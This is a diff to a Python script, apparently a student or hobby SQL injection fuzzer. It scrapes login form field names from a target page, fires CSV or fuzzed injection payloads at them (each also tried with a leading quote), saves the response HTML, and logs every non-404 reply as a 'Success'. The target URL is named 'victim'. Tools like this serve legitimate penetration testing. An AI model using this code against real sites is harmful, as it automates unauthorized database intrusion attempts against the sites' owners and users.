@@ -35,20 +35,26 @@ def POST_generator(url, fuzz_flag):
 	#re.findall call looks for all name tags that satisfy the regex constraint
         form_inputs.append(re.findall(r'"(.*?)"',i)[0])
 
+    #self explanatory but checks if we've been provided a single field or if there are mutliple for us to try
     if(len(form_inputs) > 2):
+
         #here we're going to loop and keep sending injection attempts to the POST_send function
         for n in range(len(form_inputs)):
             if (n + 1 < len(form_inputs)):
+
+                #if the fuzzing option has been selected we call our fuzzer
                 if(fuzz_flag):
-                    #payload = pull_from_generator()
                     payload = fuzz()
                 else:
                     payload = pull_from_CSV()
+                
+                #writes out the attack but also tries both a quote escaped version and non quote escaped version 
                 for x,y in payload.items():
                     print("Trying: " + y + "on database: " + x + " where the URL is: " + URL + " and the forms are: " + form_inputs[n] + " " + form_inputs[n+1])
                     POST_send(URL, form_inputs[n], form_inputs[n+1], y, y)
                     POST_send(URL, form_inputs[n], form_inputs[n+1], "' "+y, "' "+y)
 
+    #same as the block prior
     else:
         for n in range(len(form_inputs)):
             if(fuzz_flag):
@@ -57,7 +63,8 @@ def POST_generator(url, fuzz_flag):
                 payload = pull_from_CSV()
                 for x,y in payload.items():
                     print("Trying: " + y + "on database: " + x + " where the URL is: " + URL + " and the form is: " + form_inputs[n])
-                    POST_send(URL, form_inputs[n], y)
+                    POST_send_single(URL, form_inputs[n], y)
+                    POST_send_single(URL, form_inputs[n], "' "+y)
 
 #Actually sends the POST request with the payload/information as specified 
 def POST_send(URL, username_field, password_field, username_input, password_input):
@@ -67,18 +74,33 @@ def POST_send(URL, username_field, password_field, username_input, password_inpu
     r = requests.post(victim, payload)
     
     #temp test code to write to file
-    file = open("hi.txt", "a")
-    file.write("Hello this is the payload: " + username_input + "\n\n" + r.text + "\n\n")
+    file = open("Fuzz_HTML", "a")
+    file.write("Payload: " + username_input + "\n\n" + r.text + "\n\n")
+    
+    #for any non 404 status code we log it
+    if(r.status_code != 404):
+        file_success = open("Successes", "a")
+        file_success.write("Payload: " + username_input + "\n\n" + r.text + "\n\n")
+
+    #prints the status code and the attempted payload
     print(r.status_code)
+    print("Payload: " + username_input + "\n\n where the URL is: " + URL + "\n\n")
 
 #Actually sends the POST request with the payload/information as specified 
-def POST_send(URL, field, input):
+def POST_send_single(URL, field, input):
     
     payload = {field: input}
     victim = URL
     r = requests.post(victim, payload)
     
     #temp test code to write to file
-    file = open("hi.txt", "a")
-    file.write("Hello this is the payload: " + input + "\n\n" + r.text + "\n\n")
+    file = open("Non_fuzz_HTML.txt", "a")
+    file.write("Payload: " + input + "\n\n" + r.text + "\n\n")
+
+    #for any non 404 status code we log it
+    if(r.status_code != 404):
+        file_success = open("Successes", "a")
+        file_success.write("Payload: " + input + "\n\n where the URL is: " + URL + "\n\n")
+
     print(r.status_code)
+    print("Payload: " + input + "\n\n where the URL is: " + URL + "\n\n")
